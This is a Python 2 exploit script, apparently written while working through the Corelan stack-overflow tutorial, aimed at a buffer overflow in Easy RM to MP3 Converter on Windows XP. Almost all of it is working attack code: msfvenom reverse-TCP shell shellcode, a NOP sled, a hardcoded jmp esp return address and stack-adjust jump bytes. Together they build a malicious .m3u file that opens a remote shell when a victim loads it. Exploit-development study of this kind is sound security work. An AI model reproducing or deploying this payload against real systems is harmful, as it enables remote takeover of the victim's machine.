#!/usr/bin/env python
#
# Script Name   : easy-rm-sploit5.py
# Tutorial Link : https://www.corelan.be (Part 2 Stack Based Overflows)
# Req Modules   : None standard
# Author        : wetw0rk
# Target OS     : Windows XP
# Version       : 1.0
# Python Ver.   : 2.7
# Description   : Simply an exploit that takes advantage of a stack
#                 buffer overflow in the Easy RM to MP3 Conversion Utility
#                 in this example dealing with small buffers is demonstrated.
#


import struct

# msfvenom -p windows/shell/reverse_tcp LHOST=X LPORT=X
# -b "\x00\x09\x0a" --smallest -f python --smallest
buf =  ""
buf += "\x6a\x47\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\xb6\x47\xb3\x7a\x83\xeb\xfc\xe2\xf4\x4a\xaf\x31\x7a"
buf += "\xb6\x47\xd3\xf3\x53\x76\x73\x1e\x3d\x17\x83\xf1\xe4"
buf += "\x4b\x38\x28\xa2\xcc\xc1\x52\xb9\xf0\xf9\x5c\x87\xb8"
buf += "\x1f\x46\xd7\x3b\xb1\x56\x96\x86\x7c\x77\xb7\x80\x51"
buf += "\x88\xe4\x10\x38\x28\xa6\xcc\xf9\x46\x3d\x0b\xa2\x02"
buf += "\x55\x0f\xb2\xab\xe7\xcc\xea\x5a\xb7\x94\x38\x33\xae"
buf += "\xa4\x89\x33\x3d\x73\x38\x7b\x60\x76\x4c\xd6\x77\x88"
buf += "\xbe\x7b\x71\x7f\x53\x0f\x40\x44\xce\x82\x8d\x3a\x97"
buf += "\x0f\x52\x1f\x38\x22\x92\x46\x60\x1c\x3d\x4b\xf8\xf1"
buf += "\xee\x5b\xb2\xa9\x3d\x43\x38\x7b\x66\xce\xf7\x5e\x92"
buf += "\x1c\xe8\x1b\xef\x1d\xe2\x85\x56\x18\xec\x20\x3d\x55"
buf += "\x58\xf7\xeb\x2f\x80\x48\xb6\x47\xdb\x0d\xc5\x75\xec"
buf += "\x2e\xde\x0b\xc4\x5c\xb1\xb8\x66\xc2\x26\x46\xb3\x7a"
buf += "\x9f\x83\xe7\x2a\xde\x6e\x33\x11\xb6\xb8\x66\x10\xb3"
buf += "\x2f\x73\xd2\x3e\xe4\xdb\x78\xb6\x42\x8a\xf3\x50\x17"
buf += "\xe3\x2a\xe6\x07\xe3\x3a\xe6\x2f\x59\x75\x69\xa7\x4c"
buf += "\xaf\x21\x2d\xa3\x2c\xe1\x2f\x2a\xdf\xc2\x26\x4c\xaf"
buf += "\x33\x87\xc7\x76\x49\x09\xbb\x0f\x5a\x2f\x43\xcf\x14"
buf += "\x11\x4c\xaf\xdc\x47\xd9\x7e\xe0\x10\xdb\x78\x6f\x8f"
buf += "\xec\x85\x63\xcc\x85\x10\xf6\x2f\xb3\x6a\xb6\x47\xe5"
buf += "\x10\xb6\x2f\xeb\xde\xe5\xa2\x4c\xaf\x25\x14\xd9\x7a"
buf += "\xe0\x14\xe4\x12\xb4\x9e\x7b\x25\x49\x92\xb2\xb9\x9f"
buf += "\x81\xc6\x94\x75\x47\xb3\x7a"


file = "TwD.m3u"                                # file we will be creating
junk = "\x90"*250 + "\x90"*50 + buf             # shellcode at 300 bytes
overflow_adjust = 26073-len(junk)               # overflow occurs at 26073 bytes
junk += "\x90"*overflow_adjust                  # append remaining A's to overflow

eip = struct.pack('<L', 0x77246FA1)             # jmp esp from WININET.dll

preshellcode = "DAMN"

jump_code = "\x83\xc4\x5e"                      # add esp,0x5e
jump_code += "\x83\xc4\x5e"                     # add esp,0x5e
jump_code += "\xff\xe4"                         # jmp esp

junk += eip + preshellcode + jump_code
print "[*] writing %d bytes to m3u file" % (len(junk))
open_file = open(file, 'w')			# open file in write mode
open_file.write(junk)				# write junk to file
open_file.close()				# close file
print "[*] m3u file saved to %s" % (file)
